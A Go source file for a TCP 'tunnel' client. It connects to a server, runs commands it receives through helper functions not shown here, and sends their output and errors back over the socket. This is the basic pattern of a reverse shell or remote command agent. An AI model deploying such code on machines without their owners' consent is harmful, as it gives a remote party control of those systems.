package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
)

type TcpTunnelClient struct {
	serverConn net.Conn
}

func NewTcpTunnelClient() TcpTunnelClient {
	return TcpTunnelClient{}
}

func (t *TcpTunnelClient) Connect(serverAddress string) error {
	conn, err := net.Dial("tcp", serverAddress)
	if err != nil {
		return fmt.Errorf("[TcpTunnelClient_Connect] Connection failed to %s. Error: %w\n", serverAddress, err)
	}

	t.serverConn = conn

	fmt.Printf("Connected to server at address %s\n", serverAddress)

	if _, err := conn.Write([]byte("Hello from client!\n")); err != nil {
		return fmt.Errorf("[TcpTunnelClient_Connect] Greetung message failed. Error: %w\n", err)
	}

	return nil
}

func (t *TcpTunnelClient) Run() error {
	defer t.serverConn.Close()

	reader := bufio.NewReader(t.serverConn)
	for {
		buf, _, err := reader.ReadLine()
		inMsg := string(buf)
		if err != nil {
			if err == io.EOF {
				return io.EOF
			}
			return err
		}

		fmt.Printf("Msg from server: %s\n", inMsg)

		if isCommand(inMsg) {
			cmdOut, cmdErr := execute(inMsg)
			cmdErrString := ""
			if cmdErr != nil {
				cmdErrString = cmdErr.Error()
			}

			_, outErr := t.serverConn.Write([]byte("Command output:\n" + cmdOut))
			_, errErr := t.serverConn.Write([]byte("Command error:\n" + cmdErrString))

			if outErr != nil {
				return outErr
			}
			if errErr != nil {
				return errErr
			}
		}
	}
}
